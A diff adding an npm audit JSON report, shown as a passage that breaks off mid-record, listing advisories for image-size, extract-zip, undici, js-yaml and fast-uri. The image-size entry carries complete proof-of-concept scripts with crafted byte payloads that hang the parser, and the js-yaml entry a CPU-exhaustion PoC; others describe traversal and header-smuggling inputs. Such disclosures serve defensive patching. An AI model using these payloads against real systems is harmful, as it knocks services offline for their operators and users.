@@ -1,0 +1,767 @@
+{
+  "actions": [],
+  "advisories": {
+    "1120504": {
+      "findings": [
+        {
+          "version": "1.1.1",
+          "paths": [
+            ".>image-size"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/image-size/image-size/security/advisories/GHSA-m5qc-5hw7-8vg7\n- https://github.com/image-size/image-size/commit/8994131c7c3ee8da1699e04700c95e0e683a0c68\n- https://nvd.nist.gov/vuln/detail/CVE-2025-71319\n- https://joshua.hu/image-size-infinite-loop-dos-vulnerabilities\n- https://web.archive.org/web/20260224152152/https://github.com/image-size/image-size/pull/439\n- https://www.vulncheck.com/advisories/image-size-denial-of-service-via-infinite-loop-in-jxl-heif-parser\n- https://github.com/advisories/GHSA-m5qc-5hw7-8vg7",
+      "created": "2025-04-02T15:04:58.000Z",
+      "id": 1120504,
+      "npm_advisory_id": null,
+      "overview": "### Summary\n\n`image-size` is vulnerable to a Denial of Service vulnerability when processing specially crafted images.\n\nThe issue occurs because of an infine loop in `findBox` when processing certain images with a box with size `0`.\n\n\n### Details\n\nIf the first bytes of the input does not match any bytes in `firstBytes`, then the package tries to validate the image using other handlers:\n```js\n// https://github.com/image-size/image-size/blob/v1.2.0/lib/detector.ts#L20-L31\nexport function detector(input: Uint8Array): imageType | undefined {\n  const byte = input[0]\n  if (byte in firstBytes) {\n    const type = firstBytes[byte]\n    if (type && typeHandlers[type].validate(input)) {\n      return type\n    }\n  }\n\n  const finder = (key: imageType) => typeHandlers[key].validate(input) //<--\n  return keys.find(finder)\n}\n```\n\nSome handlers that call `findBox` to validate or calculate the image size are `jxl`, `heif` and `jp2`.\n\n`JXL` handler calls `findBox` inside `validate`. To reach the `findBox` call, the value at position `4:8` should be `'JXL '`\n```js\n// https://github.com/image-size/image-size/blob/v1.2.0/lib/types/jxl.ts#L51-L60\nexport const JXL: IImage = {\n  validate: (input: Uint8Array): boolean => {\n    const boxType = toUTF8String(input, 4, 8)\n    if (boxType !== 'JXL ') return false      //<---\n\n    const ftypBox = findBox(input, 'ftyp', 0) //<---\n    if (!ftypBox) return false\n\n    const brand = toUTF8String(input, ftypBox.offset + 8, ftypBox.offset + 12)\n    return brand === 'jxl '\n  },\n```\n\n`findBox` can lead to an infinite loop because the value of `box.size` is `0`, thus the `offset` variable is not updated. Below relevant code with comments (using one of the `PAYLOAD` below as example):\n```js\n// https://github.com/image-size/image-size/blob/v1.2.0/lib/types/utils.ts#L33-L37\nexport const readUInt32BE = (input: Uint8Array, offset = 0) =>\n  input[offset] * 2 ** 24 +     // 0 +\n  input[offset + 1] * 2 ** 16 + // 0 +\n  input[offset + 2] * 2 ** 8 +  // 0 +\n  input[offset + 3]             // 0\n\n// https://github.com/image-size/image-size/blob/v1.2.0/lib/types/utils.ts#L66-L75\nfunction readBox(input: Uint8Array, offset: number) {   // offset: 0\n  if (input.length - offset < 4) return\n  const boxSize = readUInt32BE(input, offset)           // 0\n  if (input.length - offset < boxSize) return           // (8 - 0) < 0 => false\n  return {\n    name: toUTF8String(input, 4 + offset, 8 + offset),  // 'JXL '\n    offset,                                             // 0\n    size: boxSize,                                      // 0\n  }\n}\n\n// https://github.com/image-size/image-size/blob/v1.2.0/lib/types/utils.ts#L77-L84\nexport function findBox(input: Uint8Array, boxName: string, offset: number) { // boxName: 'ftyp', offset: 0\n  while (offset < input.length) {         // 0 < 8 => false\n    const box = readBox(input, offset)    // { name: 'JXL ', offset: 0, size: 0 }\n    if (!box) break                       // false\n    if (box.name === boxName) return box  // 'JXL ' === 'ftyp' => false\n    offset += box.size                    // offset += 0\n  }\n}\n\n```\n\nA similar issue occurs for `HEIF` and `JP2` handlers:\n- https://github.com/image-size/image-size/blob/v1.2.0/lib/types/heif.ts\n- https://github.com/image-size/image-size/blob/v1.2.0/lib/types/jp2.ts\n\n\n### PoC\n\nUsage:\n```bash\nnode main.js poc1|poc2\n```\n\n- poc for `image-size@2.0.1`\n```js\n// mkdir 2.0.1\n// cd 2.0.1/\n// npm i image-size@2.0.1\nconst {imageSizeFromFile} = require(\"image-size/fromFile\");\nconst {imageSize} = require(\"image-size\");\n\nconst fs = require('fs');\n\n// JXL\nconst PAYLOAD = new Uint8Array([\n  0x00, 0x00, 0x00, 0x00, // Box with size 0\n  0x4A, 0x58, 0x4C, 0x20, // \"JXL \"\n]);\n\n// HEIF\n// const PAYLOAD = new Uint8Array([\n//   0x00, 0x00, 0x00, 0x00, // Box with size 0\n//   0x66, 0x74, 0x79, 0x70, // \"ftyp\"\n//   0x61, 0x76, 0x69, 0x66  // \"avif\"\n// ]);\n\n// JP2\n// const PAYLOAD = new Uint8Array([\n//   0x00, 0x00, 0x00, 0x00, // Box with size 0\n//   0x6A, 0x50, 0x20, 0x20, // \"jP  \"\n// ]);\n\nconst FILENAME = \"./poc.svg\"\n\nfunction createPayload() {\n  fs.writeFileSync(FILENAME, PAYLOAD);\n}\n\nfunction poc1() { \n  (async () => {\n    await imageSizeFromFile(FILENAME)\n    console.log('Done') // never executed\n  })();\n}\n\nfunction poc2() {\n  imageSize(PAYLOAD)\n  console.log('Done') // never executed\n}\n\nconst pocs = new Map();\npocs.set('poc1', poc1); // node main.js poc1\npocs.set('poc2', poc2); // node main.js poc2\n\nasync function run() {\n  createPayload()\n  const args = process.argv.slice(2);\n  const t = args[0];\n  const poc = pocs.get(t) || poc1;\n  console.log(`Running poc....`)\n  await poc();\n}\n\nrun();\n```\n\n- poc for `image-size@1.2.0`\n```js\n// mkdir 1.2.0\n// cd 1.2.0/\n// npm i image-size@1.2.0\nconst sizeOf = require(\"image-size\");\nconst fs = require('fs');\n\n// JXL\nconst PAYLOAD = new Uint8Array([\n  0x00, 0x00, 0x00, 0x00, // Box with size 0\n  0x4A, 0x58, 0x4C, 0x20, // \"JXL \"\n]);\n\n// HEIF\n// const PAYLOAD = new Uint8Array([\n//   0x00, 0x00, 0x00, 0x00, // Box with size 0\n//   0x66, 0x74, 0x79, 0x70, // \"ftyp\"\n//   0x61, 0x76, 0x69, 0x66  // \"avif\"\n// ]);\n\n// JP2\n// const PAYLOAD = new Uint8Array([\n//   0x00, 0x00, 0x00, 0x00, // Box with size 0\n//   0x6A, 0x50, 0x20, 0x20, // \"jP  \"\n// ]);\n\nconst FILENAME = \"./poc.svg\"\n\nfunction createPayload() {\n  fs.writeFileSync(FILENAME, PAYLOAD);\n}\n\nfunction poc1() {\n  sizeOf(FILENAME)\n  console.log('Done') // never executed\n}\n\nfunction poc2() {\n  sizeOf(PAYLOAD)\n  console.log('Done') // never executed\n}\n\nconst pocs = new Map();\npocs.set('poc1', poc1); // node main.js poc1\npocs.set('poc2', poc2); // node main.js poc2\n\nasync function run() {\n  createPayload()\n  const args = process.argv.slice(2);\n  const t = args[0];\n  const poc = pocs.get(t) || poc1;\n  console.log(`Running poc....`)\n  await poc();\n}\n\nrun();\n```\n\n- poc for `image-size@1.1.1`\n```js\n// mkdir 1.1.1\n// cd 1.1.1/\n// npm i image-size@1.1.1\nconst sizeOf = require(\"image-size\");\nconst fs = require('fs');\n\n// HEIF\nconst PAYLOAD = new Uint8Array([\n  0x00, 0x00, 0x00, 0x00, // Box with size 0\n  0x66, 0x74, 0x79, 0x70, // \"ftyp\"\n  0x61, 0x76, 0x69, 0x66  // \"avif\"\n]);\n\nconst FILENAME = \"./poc.svg\"\n\nfunction createPayload() {\n  fs.writeFileSync(FILENAME, PAYLOAD);\n}\n\nfunction poc1() {\n  sizeOf(FILENAME)\n  console.log('Done') // never executed\n}\n\nfunction poc2() {\n  sizeOf(PAYLOAD)\n  console.log('Done') // never executed\n}\n\nconst pocs = new Map();\npocs.set('poc1', poc1); // node main.js poc1\npocs.set('poc2', poc2); // node main.js poc2\n\nasync function run() {\n  createPayload()\n  const args = process.argv.slice(2);\n  const t = args[0];\n  const poc = pocs.get(t) || poc1;\n  console.log(`Running poc....`)\n  await poc();\n}\n\nrun();\n```\n\n\n### Impact\n\nDenial of Service",
+      "reported_by": null,
+      "title": "image-size Denial of Service via Infinite Loop during Image Processing",
+      "metadata": null,
+      "cves": [
+        "CVE-2025-71319"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "image-size",
+      "vulnerable_versions": ">=1.1.0 <1.2.1",
+      "github_advisory_id": "GHSA-m5qc-5hw7-8vg7",
+      "recommendation": "Upgrade to version 1.2.1 or later",
+      "patched_versions": ">=1.2.1",
+      "updated": "2026-06-10T17:13:37.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cwe": [
+        "CWE-770",
+        "CWE-835"
+      ],
+      "url": "https://github.com/advisories/GHSA-m5qc-5hw7-8vg7"
+    },
+    "1139346": {
+      "findings": [
+        {
+          "version": "2.0.1",
+          "paths": [
+            ".>netlify-cli>extract-zip"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/ziad626/extract-zip-security-research/security/advisories/GHSA-x7jf-2287-qcpf\n- https://nvd.nist.gov/vuln/detail/CVE-2026-56876\n- https://raw.githubusercontent.com/cisagov/CSAF/develop/csaf_files/IT/white/2026/va-26-177-01.json\n- https://www.cve.org/CVERecord?id=CVE-2026-56876\n- https://github.com/advisories/GHSA-jmr9-qjv8-65gv",
+      "created": "2026-06-26T18:34:00.000Z",
+      "id": 1139346,
+      "npm_advisory_id": null,
+      "overview": "extract-zip does not validate symlink targets when extracting zip archives. When processing a malicious zip file containing a symlink with a relative path like '../../../../etc/passwd', extract-zip will extract the symlink without validation, allowing it to point outside the extraction directory. Depending on how extract-zip is used, an attacker could read or write to arbitrary files.",
+      "reported_by": null,
+      "title": "extract-zip unvalidated symlink path traversal",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-56876"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "extract-zip",
+      "vulnerable_versions": "<=2.0.1",
+      "github_advisory_id": "GHSA-jmr9-qjv8-65gv",
+      "recommendation": "None",
+      "patched_versions": "<0.0.0",
+      "updated": "2026-08-12T19:22:04.000Z",
+      "cvss": {
+        "score": 8.1,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N"
+      },
+      "cwe": [
+        "CWE-22"
+      ],
+      "url": "https://github.com/advisories/GHSA-jmr9-qjv8-65gv"
+    },
+    "1193685": {
+      "findings": [
+        {
+          "version": "2.0.1",
+          "paths": [
+            ".>netlify-cli>extract-zip"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://nvd.nist.gov/vuln/detail/CVE-2026-19693\n- https://github.com/max-mapper/extract-zip\n- https://www.npmjs.com/package/extract-zip\n- https://github.com/max-mapper/extract-zip/pull/160\n- https://github.com/advisories/GHSA-7pqw-9j4j-h8q3",
+      "created": "2026-08-17T15:30:40.000Z",
+      "id": 1193685,
+      "npm_advisory_id": null,
+      "overview": "extract-zip through 2.0.1 containment-checks only the parent directory of each archive entry and never the entry's own final path component, so an archive containing two entries with identical names - a symlink whose target is outside the destination, followed by a regular file - writes through the planted symlink and yields an arbitrary file write outside the destination directory.",
+      "reported_by": null,
+      "title": "extract-zip allows arbitrary file writes through symlink archive entries",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-19693"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "extract-zip",
+      "vulnerable_versions": "<=2.0.1",
+      "github_advisory_id": "GHSA-7pqw-9j4j-h8q3",
+      "recommendation": "None",
+      "patched_versions": "<0.0.0",
+      "updated": "2026-09-08T20:42:53.000Z",
+      "cvss": {
+        "score": 8.1,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:H"
+      },
+      "cwe": [
+        "CWE-22"
+      ],
+      "url": "https://github.com/advisories/GHSA-7pqw-9j4j-h8q3"
+    },
+    "1239766": {
+      "findings": [
+        {
+          "version": "1.1.1",
+          "paths": [
+            ".>image-size"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://nvd.nist.gov/vuln/detail/CVE-2025-71330\n- https://joshua.hu/image-size-infinite-loop-dos-vulnerabilities\n- https://web.archive.org/web/20260224152152/https://github.com/image-size/image-size/pull/439\n- https://www.vulncheck.com/advisories/image-size-denial-of-service-via-malformed-icns-image-parsing\n- https://codeberg.org/image-size/image-size/commit/e6e83a5578961de81f6d5834d90fb7430d8f29a5\n- https://github.com/advisories/GHSA-w3rx-r6r6-pgpr",
+      "created": "2026-06-10T15:31:30.000Z",
+      "id": 1239766,
+      "npm_advisory_id": null,
+      "overview": "image-size through 2.0.2 contains a denial of service vulnerability that allows remote attackers to permanently block the Node.js event loop by supplying a specially crafted ICNS image buffer. Attackers can craft an ICNS buffer containing valid magic bytes and a zero-valued entry length field to trigger an infinite loop in the ICNS parser, as the offset is never incremented when the entry length field is 0, causing the while loop condition to remain true indefinitely.",
+      "reported_by": null,
+      "title": "image-size: ICNS parser allows denial of service through an infinite loop",
+      "metadata": null,
+      "cves": [
+        "CVE-2025-71330"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "image-size",
+      "vulnerable_versions": ">=0.6.3 <=2.0.2",
+      "github_advisory_id": "GHSA-w3rx-r6r6-pgpr",
+      "recommendation": "Upgrade to version 2.0.3 or later",
+      "patched_versions": ">=2.0.3",
+      "updated": "2026-09-24T18:23:12.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cwe": [
+        "CWE-835"
+      ],
+      "url": "https://github.com/advisories/GHSA-w3rx-r6r6-pgpr"
+    },
+    "1239934": {
+      "findings": [
+        {
+          "version": "6.28.0",
+          "paths": [
+            ".>expo>@expo/cli>undici"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/nodejs/undici/security/advisories/GHSA-3wwx-pv8p-q78v\n- https://nvd.nist.gov/vuln/detail/CVE-2026-85024\n- https://github.com/nodejs/undici/commit/07c60d9c7099a910451244afe42861bbdbdd974c\n- https://github.com/nodejs/undici/commit/4411a238a98e8791da5fff10cc9e3578a7668ed6\n- https://github.com/nodejs/undici/commit/63cf698b611fecc6ee0a17b185b930051e4b982f\n- https://cna.openjsf.org/security-advisories.html\n- https://github.com/nodejs/undici/releases/tag/v6.28.1\n- https://github.com/nodejs/undici/releases/tag/v7.29.1\n- https://github.com/nodejs/undici/releases/tag/v8.10.2\n- https://github.com/advisories/GHSA-3wwx-pv8p-q78v",
+      "created": "2026-09-28T21:42:37.000Z",
+      "id": 1239934,
+      "npm_advisory_id": null,
+      "overview": "## Impact\n\nundici's WebSocket client (including Node.js's bundled `globalThis.WebSocket`) crashes the entire Node.js process when a remote WebSocket peer sends a permessage-deflate compressed message that crosses the decompressed-payload size limit and then contains a malformed DEFLATE block. In `lib/web/websocket/permessage-deflate.js`, the size-limit cleanup calls `removeAllListeners()` on the internal zlib `InflateRaw`, removing its `error` listener, but leaves the stream running. The inflater then emits a `Z_DATA_ERROR` with no listener attached, which Node.js treats as a fatal unhandled `error` event and terminates the process. Application `error`/`close` handlers on the public WebSocket cannot observe or prevent this, because the failing object is the internal `InflateRaw`.\n\nA malicious or compromised WebSocket server can crash a client with a single connection, unauthenticated and without any application mistake. The attack is asymmetric (about 130 KB on the wire expands past the limit) and can be repeated on reconnect (crash loop).\n\nAffected applications are those using the undici WebSocket client (`new WebSocket(...)`) or Node.js's bundled `globalThis.WebSocket` that can be induced to connect to an attacker-controlled or compromised WebSocket endpoint.\n\n## Patches\n\nUpgrade to undici v6.28.1, v7.29.1 or v8.10.2.\n\n## Workarounds\n\nNo workaround is available.",
+      "reported_by": null,
+      "title": "undici vulnerable to Denial of Service via unhandled error in WebSocket permessage-deflate decompression",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-85024"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "undici",
+      "vulnerable_versions": ">=6.25.0 <6.28.1",
+      "github_advisory_id": "GHSA-3wwx-pv8p-q78v",
+      "recommendation": "Upgrade to version 6.28.1 or later",
+      "patched_versions": ">=6.28.1",
+      "updated": "2026-09-28T21:42:38.000Z",
+      "cvss": {
+        "score": 5.9,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cwe": [
+        "CWE-248"
+      ],
+      "url": "https://github.com/advisories/GHSA-3wwx-pv8p-q78v"
+    },
+    "1239991": {
+      "findings": [
+        {
+          "version": "5.3.0",
+          "paths": [
+            ".>@eslint/eslintrc>js-yaml"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/nodeca/js-yaml/security/advisories/GHSA-r3ph-w7gj-g6xm\n- https://github.com/nodeca/js-yaml/commit/6a8e05f9a485188ed730ac81e81ae221352ef480\n- https://github.com/nodeca/js-yaml/releases/tag/5.4.1\n- https://github.com/advisories/GHSA-r3ph-w7gj-g6xm",
+      "created": "2026-09-29T17:57:39.000Z",
+      "id": 1239991,
+      "npm_advisory_id": null,
+      "overview": "## Summary\n\n`maxTotalMergeKeys` does not count empty mappings. An attacker can repeatedly merge a large sequence of them and consume significant CPU without reaching the configured limit.\n\n## Example\n\n```yaml\narr: &arr [{}, {}, {}, ...] # N empty mappings\ntargets:\n  - <<: *arr                # repeated K times\n```\n\nFor every target, the loader iterates all `N` elements of `arr`. This results in `O(N * K)` work while `totalMergeKeys` remains unchanged.\n\n## PoC\n\n```js\nimport { performance } from 'node:perf_hooks'\nimport { load, YAML11_SCHEMA } from 'js-yaml'\n\nconst n = 20000\n\nconst src =\n  'arr: &arr [' + '{},'.repeat(n).slice(0, -1) + ']\\n' +\n  'targets:\\n' +\n  '  - <<: *arr\\n'.repeat(n)\n\nconst started = performance.now()\n\nload(src, { schema: YAML11_SCHEMA })\n\nconsole.log(`${(performance.now() - started).toFixed(1)} ms`)\n```\n\nObserved results:\n\n| N | YAML size | Time |\n|---:|---:|---:|\n| 800 | ~13 KB | ~20 ms |\n| 3200 | ~50 KB | ~180 ms |\n| 20000 | ~500 KB | ~13 s |\n\n## Impact\n\nWhen merge keys are enabled, an attacker can submit a relatively small YAML document that causes prolonged CPU consumption despite the default `maxTotalMergeKeys` limit.\n\n## Fix\n\nCount every merge source mapping as one budget unit in addition to counting its keys.",
+      "reported_by": null,
+      "title": "js-yaml: maxTotalMergeKeys does not limit CPU use for empty merge sources",
+      "metadata": null,
+      "cves": [],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "js-yaml",
+      "vulnerable_versions": ">=5.0.0 <=5.4.0",
+      "github_advisory_id": "GHSA-r3ph-w7gj-g6xm",
+      "recommendation": "Upgrade to version 5.4.1 or later",
+      "patched_versions": ">=5.4.1",
+      "updated": "2026-09-29T17:57:40.000Z",
+      "cvss": {
+        "score": 5.3,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L"
+      },
+      "cwe": [
+        "CWE-400",
+        "CWE-407"
+      ],
+      "url": "https://github.com/advisories/GHSA-r3ph-w7gj-g6xm"
+    },
+    "1240039": {
+      "findings": [
+        {
+          "version": "6.28.0",
+          "paths": [
+            ".>expo>@expo/cli>undici"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/nodejs/undici/security/advisories/GHSA-r53p-7pc4-xj5r\n- https://nvd.nist.gov/vuln/detail/CVE-2026-18540\n- https://github.com/nodejs/undici/commit/0160a719063fb0a77f4fdf9500b9166b91e14329\n- https://github.com/nodejs/undici/commit/cd8af90b38ae33c2838d54a2d629774122effe95\n- https://github.com/nodejs/undici/commit/ce31bc824b578008faae5d3350da66c1b5f71548\n- https://hackerone.com/reports/3900104\n- https://hackerone.com/reports/3900615\n- https://cna.openjsf.org/security-advisories.html\n- https://github.com/nodejs/undici/releases/tag/v6.28.1\n- https://github.com/nodejs/undici/releases/tag/v7.29.1\n- https://github.com/nodejs/undici/releases/tag/v8.10.2\n- https://github.com/advisories/GHSA-r53p-7pc4-xj5r",
+      "created": "2026-09-29T18:22:07.000Z",
+      "id": 1240039,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n\nUndici's `interceptors.retry()` can resume a request after a partial response and append the resumed bytes to an already partially delivered body, while the application still receives the original response's status and headers. When that response carried a `Content-Length`, the application can receive a longer body. Applications that forward Undici's status, headers, and body downstream without recalculating framing, for example proxy or gateway applications, may emit a response whose body exceeds the forwarded `Content-Length`, and the excess bytes can be read as the start of a subsequent HTTP response (downstream response splitting or desynchronization).\n\nFor example, a `404 Not Found` with `Content-Length: 2` that sends one byte then closes can be resumed with an open-ended `Range` request, and the resumed `206 Partial Content` bytes are appended, so the application receives more than two body bytes while still seeing `Content-Length: 2`. The bug requires `interceptors.retry()` enabled, an attacker-controlled or faulty upstream, and a downstream forwarder that does not recalculate `Content-Length`.\n\n### Patches\n\nPatched in undici v6.28.1, v7.29.1, and v8.10.2. Upgrade to one of these or later.\n\n### Workarounds\n\n- Disable `interceptors.retry()` for untrusted upstreams, or set `maxRetries: 0`.\n- Remove or recalculate `Content-Length` before forwarding a response body assembled by Undici.",
+      "reported_by": null,
+      "title": "undici vulnerable to downstream response splitting via retry interceptor",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-18540"
+      ],
+      "access": "public",
+      "severity": "low",
+      "module_name": "undici",
+      "vulnerable_versions": "<6.28.1",
+      "github_advisory_id": "GHSA-r53p-7pc4-xj5r",
+      "recommendation": "Upgrade to version 6.28.1 or later",
+      "patched_versions": ">=6.28.1",
+      "updated": "2026-09-29T18:22:08.000Z",
+      "cvss": {
+        "score": 3.7,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:N"
+      },
+      "cwe": [
+        "CWE-444"
+      ],
+      "url": "https://github.com/advisories/GHSA-r53p-7pc4-xj5r"
+    },
+    "1240042": {
+      "findings": [
+        {
+          "version": "6.28.0",
+          "paths": [
+            ".>expo>@expo/cli>undici"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/nodejs/undici/security/advisories/GHSA-rfgv-xxqx-mfg5\n- https://nvd.nist.gov/vuln/detail/CVE-2026-19534\n- https://github.com/nodejs/undici/commit/2af0faf88b906d3127a360c3ac75164c0f95e5a5\n- https://github.com/nodejs/undici/commit/6615e0175e9b635bcd2e3e87a47daa82f6f5b728\n- https://github.com/nodejs/undici/commit/66e12816064cf3068f63bd134748b7fc4e779bad\n- https://cna.openjsf.org/security-advisories.html\n- https://github.com/nodejs/undici/releases/tag/v6.28.1\n- https://github.com/nodejs/undici/releases/tag/v7.29.1\n- https://github.com/nodejs/undici/releases/tag/v8.10.2\n- https://github.com/advisories/GHSA-rfgv-xxqx-mfg5",
+      "created": "2026-09-29T18:21:33.000Z",
+      "id": 1240042,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n\nThe undici WebSocket client throws an uncaught `TypeError` during the opening handshake when a server's `101` response includes a `Sec-WebSocket-Protocol` header that the client never requested. The throw occurs in a `queueMicrotask` callback with no surrounding `try`/`catch`, so it propagates as an uncaught exception and terminates the Node.js process. This is a remote, unauthenticated denial of service against any application that opens a WebSocket to an attacker controlled or compromised server, or over a plaintext `ws://` connection subject to a machine-in-the-middle. It affects the default `new WebSocket(url)` usage, where no subprotocol is requested. Per RFC 6455 section 4.1, an unrequested subprotocol must fail the connection, not crash it.\n\nAll releases starting at undici 6.7.0 are affected.\n\n### Patches\n\nUpgrade to undici 6.28.1, 7.29.1, or 8.10.2.\n\n### Workarounds\n\nNo workaround is available. The fix must be applied through an upgrade.",
+      "reported_by": null,
+      "title": "undici vulnerable to Denial of Service via unrequested WebSocket subprotocol",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-19534"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "undici",
+      "vulnerable_versions": ">=6.7.0 <6.28.1",
+      "github_advisory_id": "GHSA-rfgv-xxqx-mfg5",
+      "recommendation": "Upgrade to version 6.28.1 or later",
+      "patched_versions": ">=6.28.1",
+      "updated": "2026-09-29T18:21:41.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cwe": [
+        "CWE-248",
+        "CWE-252"
+      ],
+      "url": "https://github.com/advisories/GHSA-rfgv-xxqx-mfg5"
+    },
+    "1240090": {
+      "findings": [
+        {
+          "version": "4.1.4",
+          "paths": [
+            ".>netlify-cli>@netlify/build>@netlify/framework-info>ajv>fast-uri"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/fastify/fast-uri/security/advisories/GHSA-hrr3-gc8f-f4qj\n- https://nvd.nist.gov/vuln/detail/CVE-2026-86472\n- https://github.com/fastify/fast-uri/commit/5dabb86732aa2a7655e258719970e61e12b6b4d1\n- https://cna.openjsf.org/security-advisories.html\n- https://github.com/fastify/fast-uri/releases/tag/v2.4.7\n- https://github.com/fastify/fast-uri/releases/tag/v3.1.8\n- https://github.com/fastify/fast-uri/releases/tag/v4.1.5\n- https://github.com/advisories/GHSA-hrr3-gc8f-f4qj",
+      "created": "2026-09-29T23:54:25.000Z",
+      "id": 1240090,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n\n`fast-uri` folds the host to lowercase before it percent-decodes the host, so a percent-encoded uppercase unreserved octet such as `%41` decodes to a literal `A` that is never folded. For a scheme-relative reference (`//host`) there is no scheme, so the host canonicalization that repairs this on a scheme-bearing URL does not run. As a result `parse`, `normalize`, and `equal` disagree on the same host: `parse(\"//%41.com\").host` returns `\"A.com\"` while `parse(\"//a.com\").host` and `parse(\"//A.com\").host` return `\"a.com\"`, and `equal(\"//%41.com\", \"//a.com\")` is `false` even though `equal(\"//A.com\", \"//a.com\")` is `true`. An application that makes a case-sensitive host decision on `fast-uri` output for a scheme-relative reference, for example a host allowlist or denylist that compares `parse(url).host` or uses `fast-uri.equal`, can be steered past the check with a percent-encoded uppercase octet. Because a hostname is case-insensitive in DNS and HTTP routing, the evading spelling reaches the same host the check meant to gate, so the effect is check evasion rather than reaching a different registrable host.\n\n### Patches\n\nUpgrade to `fast-uri` 4.1.5, 3.1.8, or 2.4.7.\n\n### Workarounds\n\nCompare hosts case-insensitively (lowercase the parsed host before any allowlist or denylist decision), or avoid making case-sensitive host decisions on scheme-relative input until upgrading.",
+      "reported_by": null,
+      "title": "fast-uri vulnerable to inconsistent host case normalization via percent-encoded octets",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-86472"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "fast-uri",
+      "vulnerable_versions": ">=4.0.0 <4.1.5",
+      "github_advisory_id": "GHSA-hrr3-gc8f-f4qj",
+      "recommendation": "Upgrade to version 4.1.5 or later",
+      "patched_versions": ">=4.1.5",
+      "updated": "2026-09-29T23:54:26.000Z",
+      "cvss": {
+        "score": 4.8,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:N"
+      },
+      "cwe": [
+        "CWE-178"
+      ],
+      "url": "https://github.com/advisories/GHSA-hrr3-gc8f-f4qj"
+    },
+    "1240093": {
+      "findings": [
+        {
+          "version": "4.1.4",
+          "paths": [
+            ".>netlify-cli>@netlify/build>@netlify/framework-info>ajv>fast-uri"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/fastify/fast-uri/security/advisories/GHSA-jvvf-x445-j334\n- https://nvd.nist.gov/vuln/detail/CVE-2026-86818\n- https://github.com/fastify/fast-uri/commit/f40a88f33e684a46faec3f5b820bcbb1e85add64\n- https://cna.openjsf.org/security-advisories.html\n- https://github.com/fastify/fast-uri/releases/tag/v4.1.5\n- https://github.com/advisories/GHSA-jvvf-x445-j334",
+      "created": "2026-09-29T23:51:16.000Z",
+      "id": 1240093,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n\n`fast-uri`'s `mailto` scheme parser compares each query field name to the reserved names (`to`, `subject`, `body`) while the name is still percent-encoded, and only percent-decodes it when storing it as a generic header. On serialize, the decoded name is re-emitted, so a field name such as `%74o` (percent-encoded `to`) is not recognized as a recipient at parse time (`parse().to` shows only the legitimate recipient) but materializes as a literal `to=` field after `serialize()`, and reparsing then treats it as a recipient. The same technique smuggles `subject` and `body` through `%73ubject` and `%62ody`.\n\nAn application that parses an untrusted mailto URI, makes a display, allowlist, or logging decision on `parse().to`, then re-serializes the result and passes the serialized string to a mail client or an outbound send path can gain an attacker-chosen recipient, subject, or body that was not visible when the recipient list was checked. A scanner inspecting the raw input for an extra `to=` sees nothing, because the injected field appears only after `fast-uri` serializes.\n\n### Patches\n\nUpgrade to `fast-uri` 4.1.5.\n\n### Workarounds\n\nPercent-decode and compare mailto field names case-insensitively before trusting `parse().to`, or re-check the recipient list on the serialized output rather than only on the initial parse, until upgrading.",
+      "reported_by": null,
+      "title": "fast-uri vulnerable to mailto header injection via percent-encoded field-name desynchronization",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-86818"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "fast-uri",
+      "vulnerable_versions": ">=4.1.3 <4.1.5",
+      "github_advisory_id": "GHSA-jvvf-x445-j334",
+      "recommendation": "Upgrade to version 4.1.5 or later",
+      "patched_versions": ">=4.1.5",
+      "updated": "2026-09-29T23:51:17.000Z",
+      "cvss": {
+        "score": 4.8,
